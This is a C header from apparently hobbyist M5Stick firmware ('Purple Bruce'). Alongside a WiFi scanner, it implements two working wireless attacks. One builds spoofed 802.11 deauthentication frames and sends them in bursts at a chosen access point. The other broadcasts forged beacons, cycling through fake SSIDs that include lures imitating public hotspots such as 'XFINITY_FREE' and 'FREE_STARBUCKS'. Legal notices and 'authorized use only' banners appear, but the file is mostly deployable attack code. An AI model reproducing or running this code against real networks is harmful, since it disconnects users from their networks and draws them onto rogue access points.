/*
 * pb_wifi.h — Purple Bruce M5Stick WiFi Features
 *
 * Modes:
 *   WIFI_SCAN — passive network scanner
 *   DEAUTH    — deauthentication frame injection (authorized testing only)
 *   BEACON    — beacon frame spam with chaos-magic SSIDs
 *
 * LEGAL NOTICE: Deauth and beacon injection affect wireless networks.
 * Use ONLY on networks and equipment you own or have explicit written
 * permission to test. Unauthorized use is illegal in most jurisdictions.
 */

#pragma once
#include <WiFi.h>
#include "esp_wifi.h"
#include "pb_display.h"

// ── AP record ───────────────────────────────────────────────────
struct APInfo {
    char    ssid[33];
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t channel;
    uint8_t auth;       // wifi_auth_mode_t
};

#define MAX_APS 16
static APInfo   ap_list[MAX_APS];
static int      ap_count    = 0;
static int      ap_scroll   = 0;
static int      ap_target   = 0;    // deauth target index

static bool     scan_running = false;
static bool     scan_done    = false;

// ── Chaos SSID pool for beacon spam ────────────────────────────
static const char* CHAOS_SSIDS[] = {
    "PURPLE BRUCE NODE",
    "SIGIL_NETWORK_9",
    "CHAOS SERVITOR",
    "DAEMON_HOTSPOT",
    "VOID_NETWORK_X",
    "ENTROPY_MESH",
    "INVOKE_NET_6",
    "NULL_PTR_WIFI",
    "BLACKARCH_NODE",
    "PENTEST_LAB_X",
    "PURPLE_TEAM_AP",
    "CHAOS_MAGIC_NET",
    "XFINITY_FREE",       // classic lure
    "ATT_5G_PUBLIC",
    "FREE_STARBUCKS",
    "PURPLE_ENIGMA",
};
#define N_CHAOS_SSIDS 16

static bool    beacon_active     = false;
static uint32_t beacon_sent      = 0;
static int     beacon_ssid_idx   = 0;
static uint8_t beacon_channel    = 6;

// ── Deauth frame template ───────────────────────────────────────
static uint8_t deauth_buf[26] = {
    0xC0, 0x00,                          // Frame Control: Mgmt, Deauth
    0x3A, 0x01,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: (AP BSSID, filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled)
    0xF0, 0xFF,                          // Sequence number
    0x07, 0x00                           // Reason: Class-3 frame
};

// ── WiFi init for injection (promiscuous capable) ───────────────
inline void pbWifiInitInject() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    delay(100);
    esp_wifi_set_promiscuous(true);
}

// ── Start async WiFi scan ───────────────────────────────────────
inline void pbWifiScanStart() {
    scan_done    = false;
    scan_running = true;
    ap_count     = 0;
    ap_scroll    = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    WiFi.scanNetworks(true);  // async
}

// ── Check async scan completion (call from loop) ────────────────
inline void pbWifiScanCheck() {
    if (!scan_running) return;
    int n = WiFi.scanComplete();
    if (n == WIFI_SCAN_RUNNING) return;
    scan_running = false;
    scan_done    = true;
    if (n < 0) { ap_count = 0; return; }
    ap_count = min(n, MAX_APS);
    for (int i = 0; i < ap_count; i++) {
        strlcpy(ap_list[i].ssid, WiFi.SSID(i).c_str(), 33);
        WiFi.BSSID(i, ap_list[i].bssid);
        ap_list[i].rssi    = WiFi.RSSI(i);
        ap_list[i].channel = (uint8_t)WiFi.channel(i);
        ap_list[i].auth    = (uint8_t)WiFi.encryptionType(i);
    }
    WiFi.scanDelete();
    // sort by RSSI (bubble sort, small list)
    for (int i = 0; i < ap_count - 1; i++)
        for (int j = 0; j < ap_count - i - 1; j++)
            if (ap_list[j].rssi < ap_list[j+1].rssi)
                { APInfo tmp = ap_list[j]; ap_list[j] = ap_list[j+1]; ap_list[j+1] = tmp; }
}

// ── Send deauth burst at selected AP ───────────────────────────
inline void pbDeauthFire(int target, int count = 64) {
    if (target < 0 || target >= ap_count) return;
    APInfo& ap = ap_list[target];
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    memcpy(&deauth_buf[10], ap.bssid, 6);
    memcpy(&deauth_buf[16], ap.bssid, 6);
    for (int i = 0; i < count; i++) {
        deauth_buf[22] = (uint8_t)(i & 0xFF);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_buf, sizeof(deauth_buf), false);
        delay(2);
    }
}

// ── Build a minimal beacon frame ─────────────────────────────────
static int buildBeacon(uint8_t* buf, const char* ssid,
                        uint8_t chan, uint8_t* bssid) {
    memset(buf, 0, 128);
    int i = 0;
    buf[i++] = 0x80; buf[i++] = 0x00;         // Frame: Beacon
    buf[i++] = 0x00; buf[i++] = 0x00;         // Duration
    memset(&buf[i], 0xFF, 6); i += 6;          // DA: broadcast
    memcpy(&buf[i], bssid, 6); i += 6;         // SA = BSSID
    memcpy(&buf[i], bssid, 6); i += 6;         // BSSID
    buf[i++] = 0x00; buf[i++] = 0x00;          // Seq
    // Fixed params
    uint64_t ts = (uint64_t)millis() * 1000;
    memcpy(&buf[i], &ts, 8); i += 8;           // Timestamp
    buf[i++] = 0x64; buf[i++] = 0x00;          // Interval 100TU
    buf[i++] = 0x11; buf[i++] = 0x00;          // Capabilities
    // SSID tag
    int slen = min((int)strlen(ssid), 32);
    buf[i++] = 0x00; buf[i++] = (uint8_t)slen;
    memcpy(&buf[i], ssid, slen); i += slen;
    // Supported rates
    static const uint8_t rates[] = {
        0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24
    };
    memcpy(&buf[i], rates, sizeof(rates)); i += sizeof(rates);
    // DS param (channel)
    buf[i++] = 0x03; buf[i++] = 0x01; buf[i++] = chan;
    return i;
}

// ── Beacon tick (call from loop when beacon_active) ─────────────
inline void pbBeaconTick() {
    if (!beacon_active) return;
    static uint32_t lastBeacon = 0;
    if (millis() - lastBeacon < 100) return;
    lastBeacon = millis();

    uint8_t bssid[6] = {0xDE, 0xAD, 0xBE, 0xEF,
                         0x00, (uint8_t)beacon_ssid_idx};
    uint8_t frame[128];
    int len = buildBeacon(frame,
                          CHAOS_SSIDS[beacon_ssid_idx % N_CHAOS_SSIDS],
                          beacon_channel, bssid);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    beacon_ssid_idx = (beacon_ssid_idx + 1) % N_CHAOS_SSIDS;
    beacon_sent++;
}

// ── RSSI bar helper ──────────────────────────────────────────────
static inline const char* authStr(uint8_t a) {
    switch (a) {
        case WIFI_AUTH_OPEN:          return "OPEN";
        case WIFI_AUTH_WEP:           return "WEP ";
        case WIFI_AUTH_WPA_PSK:       return "WPA ";
        case WIFI_AUTH_WPA2_PSK:      return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:  return "WPA+";
        case WIFI_AUTH_WPA3_PSK:      return "WPA3";
        default:                      return "????";
    }
}

// ── Display: WiFi scan ──────────────────────────────────────────
inline void drawWifiScan(bool redraw, uint32_t frame) {
    if (redraw) M5.Lcd.fillScreen(PB_BG);
    drawHeader(" WIFI SCAN", PB_GREEN & 0x3FE0);  // dark green

    int y = SCR_CONTENT_Y + 2;
    M5.Lcd.setTextSize(1);

    if (scan_running) {
        M5.Lcd.setTextColor(PB_GOLD, PB_BG);
        M5.Lcd.setCursor(8, y + 18);
        M5.Lcd.printf("SCANNING... %c", spinChar(frame));
        return;
    }
    if (!scan_done) {
        M5.Lcd.setTextColor(PB_DIM, PB_BG);
        M5.Lcd.setCursor(8, y + 18);
        M5.Lcd.print("Press [B] to scan");
        drawFooter("[A]next mode [B]scan");
        return;
    }
    if (ap_count == 0) {
        M5.Lcd.setTextColor(PB_DIM, PB_BG);
        M5.Lcd.setCursor(8, y + 18);
        M5.Lcd.print("No networks found.");
        drawFooter("[A]next mode [B]rescan");
        return;
    }

    // column header
    M5.Lcd.setTextColor(PB_VIOLET, PB_BG);
    M5.Lcd.setCursor(4, y);
    M5.Lcd.printf("%-20s  %4s CH AUTH", "SSID", "RSSI");
    y += 10;
    M5.Lcd.drawFastHLine(0, y - 1, SCR_W, PB_DIM);

    int rowH = 10;
    int visible = (SCR_FOOTER_Y - y - 2) / rowH;
    int start   = ap_scroll;
    int end_    = min(start + visible, ap_count);

    for (int i = start; i < end_ && y < SCR_FOOTER_Y - 2; i++) {
        APInfo& ap = ap_list[i];
        uint16_t col = (ap.rssi > -60) ? PB_GREEN :
                       (ap.rssi > -75) ? PB_CYAN  : PB_DIM;
        M5.Lcd.setTextColor(col, PB_BG);
        M5.Lcd.setCursor(4, y);
        M5.Lcd.printf("%-20.20s %4d %2d %s",
                      ap.ssid, ap.rssi, ap.channel, authStr(ap.auth));
        y += rowH;
    }

    if (ap_count > visible) {
        M5.Lcd.setTextColor(PB_DIM, PB_BG);
        M5.Lcd.setCursor(SCR_W - 28, SCR_CONTENT_Y + 2);
        M5.Lcd.printf("%d/%d", ap_scroll + 1, ap_count);
    }
    drawFooter("[A]next mode [B]rescan [B-hold]scroll");
}

// ── Display: Deauth ─────────────────────────────────────────────
inline void drawDeauth(bool redraw) {
    if (redraw) M5.Lcd.fillScreen(PB_BG);
    drawHeader(" DEAUTH   ", PB_RED);

    int y = SCR_CONTENT_Y + 2;
    M5.Lcd.setTextSize(1);

    // Warning banner
    M5.Lcd.setTextColor(PB_RED, PB_BG);
    M5.Lcd.setCursor(4, y);
    M5.Lcd.print("!! AUTHORIZED USE ONLY !!");
    y += 12;

    if (ap_count == 0) {
        M5.Lcd.setTextColor(PB_GOLD, PB_BG);
        M5.Lcd.setCursor(4, y + 8);
        M5.Lcd.print("Run WIFI SCAN first ([A] prev mode)");
        drawFooter("[A]back to wifi scan");
        return;
    }

    APInfo& tgt = ap_list[ap_target % ap_count];

    M5.Lcd.setTextColor(PB_WHITE, PB_BG);
    M5.Lcd.setCursor(4, y);     M5.Lcd.printf("TARGET  [%d/%d]", ap_target + 1, ap_count);  y += 12;
    M5.Lcd.setTextColor(PB_MAGENTA, PB_BG);
    M5.Lcd.setCursor(4, y);     M5.Lcd.printf("SSID    %.32s", tgt.ssid);             y += 10;
    M5.Lcd.setTextColor(PB_CYAN, PB_BG);
    M5.Lcd.setCursor(4, y);
    M5.Lcd.printf("BSSID   %02X:%02X:%02X:%02X:%02X:%02X",
                  tgt.bssid[0], tgt.bssid[1], tgt.bssid[2],
                  tgt.bssid[3], tgt.bssid[4], tgt.bssid[5]);    y += 10;
    M5.Lcd.setTextColor(PB_DIM, PB_BG);
    M5.Lcd.setCursor(4, y);     M5.Lcd.printf("CH %2d   RSSI %d dBm  %s",
                  tgt.channel, tgt.rssi, authStr(tgt.auth));     y += 14;

    M5.Lcd.setTextColor(PB_GOLD, PB_BG);
    M5.Lcd.setCursor(4, y);
    M5.Lcd.print("[B] FIRE DEAUTH BURST (64 frames)");

    drawFooter("[A]next mode [B]fire [B-hold]next target");
}

// ── Display: Beacon ─────────────────────────────────────────────
inline void drawBeacon(bool redraw) {
    if (redraw) M5.Lcd.fillScreen(PB_BG);

    uint16_t hdr = beacon_active ? PB_MAGENTA : PB_PURPLE;
    drawHeader(" BEACON   ", hdr);

    int y = SCR_CONTENT_Y + 4;
    M5.Lcd.setTextSize(1);

    uint16_t statusCol = beacon_active ? PB_MAGENTA : PB_DIM;
    M5.Lcd.setTextColor(statusCol, PB_BG);
    M5.Lcd.setCursor(4, y);
    M5.Lcd.printf("STATUS   %s", beacon_active ? "BROADCASTING" : "STOPPED");   y += 12;

    const char* curSSID = CHAOS_SSIDS[beacon_ssid_idx % N_CHAOS_SSIDS];
    M5.Lcd.setTextColor(PB_CYAN, PB_BG);
    M5.Lcd.setCursor(4, y);
    M5.Lcd.printf("SSID     %.28s", curSSID);   y += 10;

    M5.Lcd.setTextColor(PB_DIM, PB_BG);
    M5.Lcd.setCursor(4, y);
    M5.Lcd.printf("CHANNEL  %d   BSSID DE:AD:BE:EF:00:??", beacon_channel);   y += 10;
    M5.Lcd.setCursor(4, y);
    M5.Lcd.printf("SSIDS    %d names cycling", N_CHAOS_SSIDS);   y += 10;
    M5.Lcd.setCursor(4, y);
    M5.Lcd.printf("FRAMES   %lu sent", (unsigned long)beacon_sent);   y += 14;

    M5.Lcd.setTextColor(PB_RED, PB_BG);
    M5.Lcd.setCursor(4, y);
    M5.Lcd.print("!! AUTHORIZED USE ONLY !!");

    drawFooter("[A]next mode [B]toggle [B-hold]chan+1");
}
